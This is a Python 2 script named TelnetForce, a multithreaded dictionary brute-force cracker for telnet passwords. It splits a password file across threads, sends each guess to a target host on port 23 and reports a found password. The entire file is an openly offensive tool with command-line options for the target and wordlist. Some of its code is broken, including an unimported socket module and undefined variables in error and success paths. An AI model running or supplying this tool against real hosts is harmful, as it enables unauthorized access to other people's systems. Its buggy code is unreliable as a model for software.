#!/usr/bin/env python

__doc__ = """ If run as a script, this module creates an instance of
TelnetForce, a brute force password cracker for telnet.

- crashdump. (Based on micron's work.)
"""

__version__="0.3"

import time
import telnetlib
import threading
from socket import error

class TelnetForce(threading.Thread):
    """ This class, when run(), tries to connect to a speficied machine
    through telnet.  It extends threading.Thread for threading

    """

    def __init__(self, threadn, host, pwdlist):
        """ Constructor that sets some values.  It calls the Thread's
        constructor first.

        params:
        host    -- so obivious...
        pwdfile -- the text file with passwords to try.

        """
        threading.Thread.__init__(self)
        self.pwdlist = pwdlist
        self.host = host
        self.threadn = threadn
        return


    def run(self):
        """ This function is called when the thread starts. """
        try:
            self.start_trying()
        except Exception as e:
            print 'thread %d - Error: %s' % (self.threadn, e)
        return

    def attempt_password(self, _pword):
        """ This function connects to 'host' and tries to login.

        params:
        _pword -- the password to try.
        host -- the name of the machine we are connecting to.

        """
        print 'thread %d - trying: %s' % (self.threadn, _pword),
        tn = telnetlib.Telnet(self.host, port=23, timeout=16)
        tn.set_debuglevel(1)
        # Conenct
        try:
            tn.read_until(b"Enter Password: ")
        except EOFError:
            print 'error: read("password") failed - connection failed ?'
            return 0
        # try a password
        try:
            #tn.write(_pword+'\r\n')
            tn.write(_pword)
        except socket.error:
            print 'thread %d - error: write(pword) failed' % (threadn)
            return 0
        # check for success
        try:
            (i,obj,byt) = tn.expect([b'Wrong Password', b'@'], 2)
        except EOFError:
            return 0
        if i == 1:
            return 1

        tn.close()
        time.sleep(1)
        return 0

    def start_trying(self):
        """
          Start trying password for the disctionnary
        """

        # change it to iterator next in list
        for pwd in self.pwdlist:
            if self.attempt_password(pwd):
                print '----'
                print 'FOUND - the password was: %s' % _pass
                exit(0)
        print 'Password not found.'
        return 0


def start_her_up(host, pwdfile, tnumber, tcount):
    """ Starts a TelnetForce thread with a splitted list of pwd based
      on the len(dict)  / modulo / nb of threads.

    params:
    host    -- so obvious...
    pwdfile -- the password dictionnary.
    tnumber -- the thread number
    tcount  -- total number of threads

    """
    dictpart = []
    pwdcnt=0
    try:
        for pwd in open(pwdfile):
            if pwdcnt % tcount == tnumber:
               dictpart.append(pwd)
            pwdcnt += 1
    except IOError:
        print 'password file: %s could not be opened' % self.pwdfile
        exit(0)
    except Exception as e:
        print 'Error: %s' % e

    tnf = TelnetForce(tnumber, host, dictpart)
    tnf.start()
    return tnf

if __name__ == "__main__":
    from optparse import OptionParser

    threads = []

    parser = OptionParser()
    parser.add_option('-o', '--host', action='store', type='string',
                      dest='host', help='The host we are connecting to. Default=10.0.0.1',
                      default='10.0.0.1')
    parser.add_option('-p', '--passwd_file', action='store',
                      type='string', dest='pfile',
                      help='A file with a new-line delimitered list of passwords. Default="pwd.txt"',
                      metavar='FILE', default='pwd.txt')
    parser.add_option('-t', '--threads', action='store', type='int',
                      dest='t_count', help='number of threads to spawn. Default=3',
                      default=3)
    (options, args) = parser.parse_args()

    print 'Starting threads..\n'

    for i in range(options.t_count):
        threads.append(start_her_up(options.host, options.pfile, i, options.t_count))
    for i in range(options.t_count):
        threads[i].join()

    print 'done.'
